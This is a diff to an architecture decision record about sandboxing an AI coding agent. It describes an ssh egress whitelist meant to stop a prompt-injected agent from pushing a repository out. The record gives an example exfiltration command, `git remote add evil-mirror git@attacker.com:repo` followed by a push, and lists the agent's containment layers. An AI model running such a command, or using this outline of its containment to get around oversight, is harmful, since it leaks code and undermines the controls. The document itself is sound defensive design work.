@@ -39,7 +39,7 @@ Specifically:
 
 Under ADR-024 D1's prompt-injection threat class, the destination-scope evolution closes a load-bearing exfil channel that the pre-evolution decision had left open: an injection-affected agent that constructs `git remote add evil-mirror git@attacker.com:repo` and pushes is refused at TCP-connect to attacker.com:22 (ADR-012 D8 evolved). Legitimate git workflows are unaffected — github/gitlab/codeberg/etc. are in the default whitelist baseline. Single config surface (`network.allowed_hosts`) governs both HTTP egress AND ssh port-22 destinations; two enforcement layers (network proxy for HTTP, iptables for ssh) compose internally.
 
-The pre-evolution residual risk ("session-long push capability if container is compromised") is now narrowed to whitelisted hosts only. DCG, compound blocker, egress whitelist (ADR-012 D1 evolved), and filesystem sandbox remain the primary containment mechanisms; the destination-scope evolution adds a new layer addressing the ssh-side of the exfil axis from ADR-024 D2.
+The pre-evolution residual risk ("session-long push capability if container is compromised") is now narrowed to whitelisted hosts only. DCG, egress whitelist (ADR-012 D1 evolved), and filesystem sandbox remain the primary containment mechanisms; the destination-scope evolution adds a new layer addressing the ssh-side of the exfil axis from ADR-024 D2.
 
 **Alternatives considered:**
 
